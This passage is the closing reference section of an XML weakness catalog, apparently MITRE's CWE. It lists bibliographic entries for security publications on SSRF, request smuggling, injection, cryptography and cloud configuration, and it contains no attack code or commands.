			<Publication_Day>---13</Publication_Day>
			<URL>https://ibreak.software/2012/11/cross-site-port-attacks-xspa-part-2/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-917">
			<Author>Riyaz Ahemed Walikar</Author>
			<Title>Cross Site Port Attacks - XSPA - Part 3</Title>
			<Publication_Year>2012</Publication_Year>
			<Publication_Month>--11</Publication_Month>
			<Publication_Day>---14</Publication_Day>
			<URL>https://ibreak.software/2012/11/cross-site-port-attacks-xspa-part-3/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-918">
			<Author>Vladimir Vorontsov</Author>
			<Author>Alexander Golovko</Author>
			<Title>SSRF attacks and sockets: smorgasbord of vulnerabilities</Title>
			<URL>http://www.slideshare.net/d0znpp/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-919">
			<Author>ONsec Lab</Author>
			<Title>SSRF bible. Cheatsheet</Title>
			<Publication_Year>2013</Publication_Year>
			<Publication_Month>--01</Publication_Month>
			<Publication_Day>---26</Publication_Day>
			<URL>https://docs.google.com/document/d/1v1TkWZtrhzRLy0bYXBcdLUedXGb9njTNIJXa3u9akHM/edit?pli=1#</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-920">
			<Author>Deral Heiland</Author>
			<Title>Web Portals: Gateway To Information, Or A Hole In Our Perimeter Defenses</Title>
			<Publication_Year>2008</Publication_Year>
			<Publication_Month>--02</Publication_Month>
			<URL>http://www.shmoocon.org/2008/presentations/Web%20portals,%20gateway%20to%20information.ppt</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-922">
			<Author>Erika Chin</Author>
			<Author>Adrienne Porter Felt</Author>
			<Author>Kate Greenwood</Author>
			<Author>David Wagner</Author>
			<Title>Analyzing Inter-Application Communication in Android</Title>
			<URL>http://www.eecs.berkeley.edu/~daw/papers/intents-mobisys11.pdf</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-923">
			<Author>Android Open Source Project</Author>
			<Title>Security Tips</Title>
			<Publication_Year>2013</Publication_Year>
			<Publication_Month>--07</Publication_Month>
			<Publication_Day>---16</Publication_Day>
			<URL>http://developer.android.com/training/articles/security-tips.html#ContentProviders</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-928">
			<Author>Ulf Harnhammar</Author>
			<Title>CRLF Injection</Title>
			<Publication>Bugtraq</Publication>
			<Publication_Year>2002</Publication_Year>
			<Publication_Month>--05</Publication_Month>
			<Publication_Day>---07</Publication_Day>
			<URL>http://marc.info/?l=bugtraq&amp;m=102088154213630&amp;w=2</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-936">
			<Author>OWASP</Author>
			<Title>Top 10 2013-A9-Using Components with Known Vulnerabilities</Title>
			<URL>https://www.owasp.org/index.php/Top_10_2013-A9-Using_Components_with_Known_Vulnerabilities</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-943">
			<Author>Apurva Udaykumar</Author>
			<Title>Setting a crossdomain.xml file for HTTP streaming</Title>
			<Publication_Year>2012</Publication_Year>
			<Publication_Month>--11</Publication_Month>
			<Publication_Day>---19</Publication_Day>
			<Publisher>Adobe</Publisher>
			<URL>http://www.adobe.com/devnet/adobe-media-server/articles/cross-domain-xml-for-streaming.html</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-944">
			<Author>Adobe</Author>
			<Title>Cross-domain policy for Flash movies</Title>
			<Publisher>Adobe</Publisher>
			<URL>http://kb2.adobe.com/cps/142/tn_14213.html</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-945">
			<Author>Microsoft Corporation</Author>
			<Title>HTTP Communication and Security with Silverlight</Title>
			<URL>http://msdn.microsoft.com/en-us/library/cc838250.aspx</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-946">
			<Author>Microsoft Corporation</Author>
			<Title>Network Security Access Restrictions in Silverlight</Title>
			<URL>http://msdn.microsoft.com/en-us/library/cc645032.aspx</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-947">
			<Author>Dongseok Jang</Author>
			<Author>Aishwarya Venkataraman</Author>
			<Author>G. Michael Sawka</Author>
			<Author>Hovav Shacham</Author>
			<Title>Analyzing the Crossdomain Policies of Flash Applications</Title>
			<Publication_Year>2011</Publication_Year>
			<Publication_Month>--05</Publication_Month>
			<URL>http://cseweb.ucsd.edu/~hovav/dist/crossdomain.pdf</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-951">
			<Author>Shaun Clowes</Author>
			<Title>A Study in Scarlet</Title>
			<URL>http://www.cgisecurity.com/lib/studyinscarlet.txt</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-952">
			<Author>Stefan Esser</Author>
			<Title>Suhosin</Title>
			<URL>http://www.hardened-php.net/suhosin/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-953">
			<Author>Johannes Ullrich</Author>
			<Title>Top 25 Series - Rank 13 - PHP File Inclusion</Title>
			<Publication_Year>2010</Publication_Year>
			<Publication_Month>--03</Publication_Month>
			<Publication_Day>---11</Publication_Day>
			<Publisher>SANS Software Security Institute</Publisher>
			<URL>http://blogs.sans.org/appsecstreetfighter/2010/03/11/top-25-series-rank-13-php-file-inclusion/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-955">
			<Author>Chris McMahon Stone</Author>
			<Author>Tom Chothia</Author>
			<Author>Flavio D. Garcia</Author>
			<Title>Spinner: Semi-Automatic Detection of Pinning without Hostname Verification</Title>
			<URL>http://www.cs.bham.ac.uk/~garciaf/publications/spinner.pdf</URL>
			<URL_Date>2018-01-16</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-956">
			<Author>Wikipedia</Author>
			<Title>Samy (computer worm)</Title>
			<URL>https://en.wikipedia.org/wiki/Samy_(computer_worm)</URL>
			<URL_Date>2018-01-16</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-957">
			<Title>Top 10 2017</Title>
			<Publication_Year>2017</Publication_Year>
			<Publication_Month>--04</Publication_Month>
			<Publication_Day>---12</Publication_Day>
			<Publisher>OWASP</Publisher>
			<URL>https://owasp.org/www-pdf-archive/OWASP_Top_10-2017_%28en%29.pdf.pdf</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-962">
			<Author>Object Management Group (OMG)</Author>
			<Title>Automated Source Code Security Measure (ASCSM)</Title>
			<Publication_Year>2016</Publication_Year>
			<Publication_Month>--01</Publication_Month>
			<URL>http://www.omg.org/spec/ASCSM/1.0/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1030">
			<Author>Eldar Marcussen</Author>
			<Title>Security issues with using PHP's escapeshellarg</Title>
			<Publication_Year>2013</Publication_Year>
			<Publication_Month>--11</Publication_Month>
			<Publication_Day>---13</Publication_Day>
			<URL>https://baesystemsai.blogspot.com/2013/11/security-issues-with-using-phps.html</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1047">
			<Author>Wikipedia</Author>
			<Title>General Data Protection Regulation</Title>
			<URL>https://en.wikipedia.org/wiki/General_Data_Protection_Regulation</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1048">
			<Author>State of California Department of Justice, Office of the Attorney General</Author>
			<Title>California Consumer Privacy Act (CCPA)</Title>
			<URL>https://oag.ca.gov/privacy/ccpa</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1053">
			<Author>NIST</Author>
			<Title>Digital Identity Guidelines (SP 800-63B)</Title>
			<Publication_Year>2017</Publication_Year>
			<Publication_Month>--06</Publication_Month>
			<URL>https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-63b.pdf</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1102">
			<Author>Chetan Conikee</Author>
			<Title>Case Files from 20 Years of Business Logic Flaws</Title>
			<Publication_Year>2020</Publication_Year>
			<Publication_Month>--02</Publication_Month>
			<URL>https://published-prd.lanyonevents.com/published/rsaus20/sessionsFiles/18217/2020_USA20_DSO-R02_01_Case%20Files%20from%2020%20Years%20of%20Business%20Logic%20Flaws.pdf</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1104">
			<Author>M. West</Author>
			<Author>M. Goodwin</Author>
			<Title>SameSite attribute specification draft</Title>
			<Publication_Year>2016</Publication_Year>
			<Publication_Month>--04</Publication_Month>
			<Publication_Day>---06</Publication_Day>
			<URL>https://tools.ietf.org/html/draft-west-first-party-cookies-07</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1105">
			<Author>Mozilla</Author>
			<Title>SameSite attribute description on MDN Web Docs</Title>
			<Publication_Year>2020</Publication_Year>
			<Publication_Month>--06</Publication_Month>
			<Publication_Day>---20</Publication_Day>
			<URL>https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1106">
			<Author>The Chromium Projects</Author>
			<Title>Chromium support for SameSite attribute</Title>
			<Publication_Year>2019</Publication_Year>
			<Publication_Month>--09</Publication_Month>
			<Publication_Day>---26</Publication_Day>
			<URL>https://www.chromium.org/updates/same-site</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1109">
			<Title>LANGSEC: Language-theoretic Security</Title>
			<URL>http://langsec.org/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1110">
			<Title>LangSec: Recognition, Validation, and Compositional Correctness for Real World Security</Title>
			<URL>http://langsec.org/bof-handout.pdf</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1111">
			<Author>Sergey Bratus</Author>
			<Author>Lars Hermerschmidt</Author>
			<Author>Sven M. Hallberg</Author>
			<Author>Michael E. Locasto</Author>
			<Author>Falcon D. Momot</Author>
			<Author>Meredith L. Patterson</Author>
			<Author>Anna Shubina</Author>
			<Title>Curing the Vulnerable Parser: Design Patterns for Secure Input Handling</Title>
			<Publication>USENIX ;login:</Publication>
			<Publication_Year>2017</Publication_Year>
			<URL>https://www.usenix.org/system/files/login/articles/login_spring17_08_bratus.pdf</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1125">
			<Author>moparisthebest</Author>
			<Title>Validation Vulnerabilities</Title>
			<Publication_Year>2015</Publication_Year>
			<Publication_Month>--06</Publication_Month>
			<Publication_Day>---05</Publication_Day>
			<URL>https://mailarchive.ietf.org/arch/msg/acme/s6Q5PdJP48LEUwgzrVuw_XPKCsM/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1138">
			<Author>Stewart Smith</Author>
			<Title>CVE-2019-6260: Gaining control of BMC from the host processor</Title>
			<Publication_Year>2019</Publication_Year>
			<URL>https://www.flamingspork.com/blog/2019/01/23/cve-2019-6260:-gaining-control-of-bmc-from-the-host-processor/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1171">
			<Author>Matthew Green</Author>
			<Title>Why IND-CPA implies randomized encryption</Title>
			<Publication_Year>2018</Publication_Year>
			<Publication_Month>--08</Publication_Month>
			<Publication_Day>---24</Publication_Day>
			<URL>https://blog.cryptographyengineering.com/why-ind-cpa-implies-randomized-encryption/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1172">
			<Author>NIST</Author>
			<Title>Recommendation for Block Cipher Modes of Operation</Title>
			<Publication_Year>2001</Publication_Year>
			<Publication_Month>--12</Publication_Month>
			<URL>https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-38a.pdf</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1192">
			<Author>Information Technology Laboratory, National Institute of Standards and Technology</Author>
			<Title>FIPS PUB 140-3: SECURITY REQUIREMENTS FOR CRYPTOGRAPHIC MODULES</Title>
			<Publication_Year>2019</Publication_Year>
			<Publication_Month>--03</Publication_Month>
			<Publication_Day>---22</Publication_Day>
			<URL>https://csrc.nist.gov/publications/detail/fips/140/3/final</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1206">
			<Title>OWASP Top 10:2021</Title>
			<Publication_Year>2021</Publication_Year>
			<Publication_Month>--09</Publication_Month>
			<Publication_Day>---24</Publication_Day>
			<Publisher>OWASP</Publisher>
			<URL>https://owasp.org/Top10/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1207">
			<Title>A01:2021 - Broken Access Control</Title>
			<Publication_Year>2021</Publication_Year>
			<Publication_Month>--09</Publication_Month>
			<Publication_Day>---24</Publication_Day>
			<Publisher>OWASP</Publisher>
			<URL>https://owasp.org/Top10/A01_2021-Broken_Access_Control/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1208">
			<Title>A02:2021 - Cryptographic Failures</Title>
			<Publication_Year>2021</Publication_Year>
			<Publication_Month>--09</Publication_Month>
			<Publication_Day>---24</Publication_Day>
			<Publisher>OWASP</Publisher>
			<URL>https://owasp.org/Top10/A02_2021-Cryptographic_Failures/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1209">
			<Title>A03:2021 - Injection</Title>
			<Publication_Year>2021</Publication_Year>
			<Publication_Month>--09</Publication_Month>
			<Publication_Day>---24</Publication_Day>
			<Publisher>OWASP</Publisher>
			<URL>https://owasp.org/Top10/A03_2021-Injection/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1210">
			<Title>A04:2021 - Insecure Design</Title>
			<Publication_Year>2021</Publication_Year>
			<Publication_Month>--09</Publication_Month>
			<Publication_Day>---24</Publication_Day>
			<Publisher>OWASP</Publisher>
			<URL>https://owasp.org/Top10/A04_2021-Insecure_Design/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1211">
			<Title>A05:2021 - Security Misconfiguration</Title>
			<Publication_Year>2021</Publication_Year>
			<Publication_Month>--09</Publication_Month>
			<Publication_Day>---24</Publication_Day>
			<Publisher>OWASP</Publisher>
			<URL>https://owasp.org/Top10/A05_2021-Security_Misconfiguration/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1212">
			<Title>A06:2021 - Vulnerable and Outdated Components</Title>
			<Publication_Year>2021</Publication_Year>
			<Publication_Month>--09</Publication_Month>
			<Publication_Day>---24</Publication_Day>
			<Publisher>OWASP</Publisher>
			<URL>https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1213">
			<Title>A07:2021 - Identification and Authentication Failures</Title>
			<Publication_Year>2021</Publication_Year>
			<Publication_Month>--09</Publication_Month>
			<Publication_Day>---24</Publication_Day>
			<Publisher>OWASP</Publisher>
			<URL>https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1214">
			<Title>A08:2021 - Software and Data Integrity Failures</Title>
			<Publication_Year>2021</Publication_Year>
			<Publication_Month>--09</Publication_Month>
			<Publication_Day>---24</Publication_Day>
			<Publisher>OWASP</Publisher>
			<URL>https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1215">
			<Title>A09:2021 - Security Logging and Monitoring Failures</Title>
			<Publication_Year>2021</Publication_Year>
			<Publication_Month>--09</Publication_Month>
			<Publication_Day>---24</Publication_Day>
			<Publisher>OWASP</Publisher>
			<URL>https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1216">
			<Title>A10:2021 - Server-Side Request Forgery (SSRF)</Title>
			<Publication_Year>2021</Publication_Year>
			<Publication_Month>--09</Publication_Month>
			<Publication_Day>---24</Publication_Day>
			<Publisher>OWASP</Publisher>
			<URL>https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1218">
		  <Author>Graham Cluley</Author>
		  <Title>This Black Box Can Brute Force Crack iPhone PIN Passcodes</Title>
			<Publication>The Mac Security Blog</Publication>
			<Publication_Year>2015</Publication_Year>
			<Publication_Month>--03</Publication_Month>
			<Publication_Day>---16</Publication_Day>
			<URL>https://www.intego.com/mac-security-blog/iphone-pin-pass-code/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1243">
		  <Author>Bruce Schneier</Author>
		  <Title>Cryptanalysis of SHA-1</Title>
		  <Publication_Year>2005</Publication_Year>
		  <Publication_Month>--02</Publication_Month>
		  <Publication_Day>---18</Publication_Day>
		  <URL>https://www.schneier.com/blog/archives/2005/02/cryptanalysis_o.html</URL>
		  <URL_Date>2021-10-25</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-1244">
		  <Author>Dan Goodin</Author>
		  <Title>At death's door for years, widely used SHA1 function is now dead</Title>
		  <Publication_Year>2017</Publication_Year>
		  <Publication_Month>--02</Publication_Month>
		  <Publication_Day>---23</Publication_Day>
		  <Publisher>Ars Technica</Publisher>
		  <URL>https://arstechnica.com/information-technology/2017/02/at-deaths-door-for-years-widely-used-sha1-function-is-now-dead/</URL>
		  <URL_Date>2021-10-25</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-1249">
		  <Author>Dawid Golunski</Author>
		  <Title>PHPMailer &lt; 5.2.18 Remote Code Execution [CVE-2016-10033]</Title>
		  <Publication_Year>2016</Publication_Year>
		  <Publication_Month>--12</Publication_Month>
		  <Publication_Day>---25</Publication_Day>
		  <URL>https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1250">
		  <Author>Dawid Golunski</Author>
		  <Title>Pwning PHP mail() function For Fun And RCE</Title>
		  <Publication_Year>2017</Publication_Year>
		  <Publication_Month>--05</Publication_Month>
		  <Publication_Day>---03</Publication_Day>
		  <URL>https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1272">
			<Author>Robert Auger</Author>
			<Title>HTTP Request Splitting</Title>
			<Publication_Year>2011</Publication_Year>
			<Publication_Month>--02</Publication_Month>
			<Publication_Day>---01</Publication_Day>
			<URL>http://projects.webappsec.org/w/page/13246929/HTTP%20Request%20Splitting</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1273">
			<Author>Robert Auger</Author>
			<Title>HTTP Response Smuggling</Title>
			<Publication_Year>2011</Publication_Year>
			<Publication_Month>--02</Publication_Month>
			<Publication_Day>---01</Publication_Day>
			<URL>http://projects.webappsec.org/w/page/13246930/HTTP%20Response%20Smuggling</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1274">
			<Author>Dzevad Alibegovic</Author>
			<Title>HTTP Request Smuggling: Complete Guide to Attack Types and Prevention</Title>
			<Publication_Year>2021</Publication_Year>
			<Publication_Month>--08</Publication_Month>
			<Publication_Day>---23</Publication_Day>
			<URL>https://brightsec.com/blog/http-request-smuggling-hrs/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1275">
			<Author>Busra Demir</Author>
			<Title>A Pentester's Guide to HTTP Request Smuggling</Title>
			<Publication_Year>2020</Publication_Year>
			<Publication_Month>--10</Publication_Month>
			<Publication_Day>---15</Publication_Day>
			<URL>https://www.cobalt.io/blog/a-pentesters-guide-to-http-request-smuggling</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1276">
			<Author>Edi Kogan</Author>
			<Author>Daniel Kerman</Author>
			<Title>HTTP Desync Attacks in the Wild and How to Defend Against Them</Title>
			<Publication_Year>2019</Publication_Year>
			<Publication_Month>--10</Publication_Month>
			<Publication_Day>---29</Publication_Day>
			<URL>https://www.imperva.com/blog/http-desync-attacks-and-defence-methods/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1277">
			<Author>James Kettle</Author>
			<Title>HTTP Desync Attacks: Request Smuggling Reborn</Title>
			<Publication_Year>2019</Publication_Year>
			<Publication_Month>--08</Publication_Month>
			<Publication_Day>---07</Publication_Day>
			<URL>https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1278">
			<Author>PortSwigger</Author>
			<Title>HTTP request smuggling</Title>
			<URL>https://portswigger.net/web-security/request-smuggling</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1279">
			<Author>CWE/CAPEC</Author>
			<Title>Neutralizing Your Inputs: A Log4Shell Weakness Story</Title>
			<URL>https://medium.com/@CWE_CAPEC/neutralizing-your-inputs-a-log4shell-weakness-story-89954c8b25c9</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1280">
			<Author>OWASP</Author>
			<Title>Expression Language Injection</Title>
			<URL>https://owasp.org/www-community/vulnerabilities/Expression_Language_Injection</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1282">
			<Author>Snyk</Author>
			<Title>Zip Slip Vulnerability</Title>
			<Publication_Year>2018</Publication_Year>
			<Publication_Month>--06</Publication_Month>
			<Publication_Day>---05</Publication_Day>
			<URL>https://security.snyk.io/research/zip-slip-vulnerability</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1283">
			<Author>Forescout Vedere Labs</Author>
			<Title>OT:ICEFALL: The legacy of "insecure by design" and its implications for certifications and risk management</Title>
			<Publication_Year>2022</Publication_Year>
			<Publication_Month>--06</Publication_Month>
			<Publication_Day>---20</Publication_Day>
			<URL>https://www.forescout.com/resources/ot-icefall-report/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1287">
			<Author>MITRE</Author>
			<Title>Supplemental Details - 2022 CWE Top 25</Title>
			<Publication_Year>2022</Publication_Year>
			<Publication_Month>--06</Publication_Month>
			<Publication_Day>---28</Publication_Day>
			<URL>https://cwe.mitre.org/top25/archive/2022/2022_cwe_top25_supplemental.html#problematicMappingDetails</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1288">
			<Author>Julia Lokrantz</Author>
			<Title>Ethical hacking of a Smart Automatic Feed Dispenser</Title>
			<Publication_Year>2021</Publication_Year>
			<Publication_Month>--06</Publication_Month>
			<Publication_Day>---07</Publication_Day>
			<URL>http://kth.diva-portal.org/smash/get/diva2:1561552/FULLTEXT01.pdf</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1295">
			<Author>WizCase</Author>
			<Title>Over 80 US Municipalities' Sensitive Information, Including Resident's Personal Data, Left Vulnerable in Massive Data Breach</Title>
			<Publication_Year>2021</Publication_Year>
			<Publication_Month>--07</Publication_Month>
			<Publication_Day>---20</Publication_Day>
			<URL>https://www.wizcase.com/blog/us-municipality-breach-report/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1296">
			<Author>Jonathan Greig</Author>
			<Title>1,000 GB of local government data exposed by Massachusetts software company</Title>
			<Publication_Year>2021</Publication_Year>
			<Publication_Month>--07</Publication_Month>
			<Publication_Day>---22</Publication_Day>
			<URL>https://www.zdnet.com/article/1000-gb-of-local-government-data-exposed-by-massachusetts-software-company/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1297">
			<Author>Amazon</Author>
			<Title>AWS Foundational Security Best Practices controls</Title>
			<Publication_Year>2022</Publication_Year>
			<URL>https://docs.aws.amazon.com/securityhub/latest/userguide/securityhub-standards-fsbp-controls.html</URL>
			<URL_Date>2022-10-11</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-1298">
			<Author>Microsoft</Author>
			<Title>Authentication and authorization in Azure App Service and Azure Functions</Title>
			<Publication_Year>2021</Publication_Year>
			<Publication_Month>--11</Publication_Month>
			<Publication_Day>---23</Publication_Day>
			<URL>https://learn.microsoft.com/en-us/azure/app-service/overview-authentication-authorization</URL>
			<URL_Date>2022-10-11</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-1299">
			<Author>Microsoft</Author>
			<Title>Azure encryption overview</Title>
			<Publication_Year>2022</Publication_Year>
			<Publication_Month>--08</Publication_Month>
			<Publication_Day>---18</Publication_Day>
			<URL>https://learn.microsoft.com/en-us/azure/security/fundamentals/encryption-overview</URL>
			<URL_Date>2022-10-11</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-1301">
			<Author>Google Cloud</Author>
			<Title>Default encryption at rest</Title>
			<Publication_Year>2022</Publication_Year>
			<Publication_Month>--10</Publication_Month>
			<Publication_Day>---11</Publication_Day>
			<URL>https://cloud.google.com/docs/security/encryption/default-encryption</URL>
			<URL_Date>2022-10-11</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-1302">
			<Author>Google Cloud</Author>
			<Title>Authentication and authorization use cases</Title>
			<Publication_Year>2022</Publication_Year>
			<Publication_Month>--10</Publication_Month>
			<Publication_Day>---11</Publication_Day>
			<URL>https://cloud.google.com/docs/authentication/use-cases</URL>
			<URL_Date>2022-10-11</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-1304">
			<Author>ICS-CERT</Author>
			<Title>ICS Alert (ICS-ALERT-13-164-01): Medical Devices Hard-Coded Passwords</Title>
			<Publication_Year>2013</Publication_Year>
			<Publication_Month>--06</Publication_Month>
			<Publication_Day>---13</Publication_Day>
			<URL>https://www.cisa.gov/uscert/ics/alerts/ICS-ALERT-13-164-01</URL>
			<URL_Date>2022-10-11</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-1307">
			<Author>Center for Internet Security</Author>
			<Title>CIS Microsoft Azure Foundations Benchmark version 1.5.0</Title>
			<Publication_Year>2022</Publication_Year>
			<Publication_Month>--08</Publication_Month>
			<Publication_Day>---16</Publication_Day>
			<URL>https://www.cisecurity.org/benchmark/azure</URL>
			<URL_Date>2023-01-19</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-1308">
			<Author>Microsoft</Author>
			<Title>Enable and manage Azure Storage Analytics logs (classic)</Title>
			<Publication_Year>2023</Publication_Year>
			<Publication_Month>--01</Publication_Month>
			<Publication_Day>---23</Publication_Day>
			<URL>https://learn.microsoft.com/en-us/azure/storage/common/manage-storage-analytics-logs</URL>
			<URL_Date>2023-01-24</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-1309">
			<Author>Microsoft</Author>
			<Title>Require secure transfer to ensure secure connections</Title>
			<Publication_Year>2022</Publication_Year>
			<Publication_Month>--07</Publication_Month>
			<Publication_Day>---24</Publication_Day>
			<URL>https://learn.microsoft.com/en-us/azure/storage/common/storage-require-secure-transfer</URL>
			<URL_Date>2023-01-24</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-1310">
			<Author>Microsoft</Author>
			<Title>Enable infrastructure encryption for double encryption of data</Title>
			<Publication_Year>2022</Publication_Year>
			<Publication_Month>--07</Publication_Month>
			<Publication_Day>---14</Publication_Day>
			<URL>https://learn.microsoft.com/en-us/azure/storage/common/infrastructure-encryption-enable</URL>
			<URL_Date>2023-01-24</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-1318">
			<Author>David Fiser, Alfredo Oliveira</Author>
			<Title>Analyzing the Hidden Danger of Environment Variables for Keeping Secrets</Title>
			<Publication_Year>2022</Publication_Year>
			<Publication_Month>--08</Publication_Month>
			<Publication_Day>---17</Publication_Day>
			<URL>https://www.trendmicro.com/en_us/research/22/h/analyzing-hidden-danger-of-environment-variables-for-keeping-secrets.html</URL>
			<URL_Date>2023-01-26</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-1319">
			<Author>Nicolas Harraudeau</Author>
			<Title>Using environment variables is security-sensitive</Title>
			<Publication_Year>2021</Publication_Year>
			<Publication_Month>--04</Publication_Month>
			<Publication_Day>---28</Publication_Day>
			<URL>https://sonarsource.atlassian.net/browse/RSPEC-5304</URL>
			<URL_Date>2023-01-26</URL_Date>
		</External_Reference>
   </External_References>
</Weakness_Catalog>